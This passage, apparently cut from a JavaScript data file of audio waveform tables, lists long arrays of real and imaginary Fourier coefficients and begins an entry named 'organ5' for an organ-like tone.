.000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002 ],  imag: [ 0, .168526, 0, 0, 0, 0, 0, 0, 0, 0, 0, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000001, 0, 0, 0, 0, .000006, -.000001, .000006, 0, .000001, 0, .000001, 0, 0, 0, .000001, 0, 0, 0, .000001, 0, .000001, 0, 0, 0, .000006, -.000001, .000005, -.000001, 0, 0, 0, 0, 0, -.000001, .000001, 0, .000001, -.000001, .000001, -.000001, .000001, -.000001, 0, 0, .000001, -.000001, .000001, 0, 0, 0, 0, 0, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, -.000001, 0, -.000001, .000001, -.000001, .000001, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, .000001, -.000001, 0, -.000001, 0, -.000001, .000001, -.000001, .000001, 0, 0, -.000001, .000001, 0, 0, -.000001, .000001, -.000001, .000001, -.000001, 0, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000002, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000002, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, -.000001, 0, -.000001, .000001, -.000001, .000001, -.000001, .000002, -.000001, .000001, -.000001, 0, -.000001, .000002, -.000002, .000001, -.000001, .000001, -.000001, .000001, 0, .000001, 0, 0, -.000001, .000001, -.000001, .000001, -.000001, .000001, 0, .000001, -.000001, 0, -.000001, .000001, 0, 0, 0, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000002, -.000001, .000002, 0, .000001, -.000002, .000001, -.000001, .000001, -.000001, 0, -.000001, .000001, 0, .000001, -.000001, .000001, -.000001, 0, -.000001, 0, -.000001, .000001, -.000001, .000002, -.000001, .000001, -.000001, .000001, -.000001, 0, -.000001, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000002, -.000001, .000001, -.000002, .000001, -.000001, 0, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000002, -.000001, .000001, -.000001, .000001, -.000002, .000002, -.000001, .000001, -.000001, .000002, -.000001, .000002, -.000001, .000001, -.000001, .000002, -.000001, .000001, -.000001, .000001, -.000001, .000002, -.000001, .000001, 0, .000001, -.000002, 0, -.000001, .000001, -.000001, .000001, -.000002, .000001, -.000002, .000001, -.000001, .000001, -.000001, 0, -.000001, .000001, -.000002, .000002, -.000001, .000001, -.000001, .000002, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000003, .000002, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "organ5",      { real: [ 0, 0, -.265053, .031303, -.066069, .013133, -.009975, .007226, -.031381, .005814, -.004185, .00364, -.002811, .002464, -.002233, .002158, -.021544, .001203, -.001169, .00089, -.000868, .000847, -.000732, .000716, -.000701, .000687, -.000653, .000641, -.00061, .000564, -.000434, .000118, -.013082, .000114, -.000112, .000111, -.000109, .000108, -.000106, .00008, -.000079, .000078, -.000077, .000076, -.000075, .000074, -.000073, .000072, -.000072, .000071, -.00007, .00007, -.000069, .000068, -.000068, .000067, -.000049, .000048, -.000048, .000048, -.000047, .000047, -.000046, .000046, -.007244, .000045, -.000045, .000045, -.000044, .000044, -.000044, .000043, -.000043, .000043, -.000043, .000042, -.000042, .000042, -.000041, .000034, -.000034, .000034, -.000034, .000033, -.000033, .000033, -.000033, .000033, -.000032, .000032, -.000032, .000032, -.000032, .000032, -.000031, .000031, -.000031, .000031, -.00003, .00003, -.00003, .000029, -.000029, .000029, -.000029, .000029, -.000029, .000029, -.000028, .000028, -.000028, .000028, -.000028, 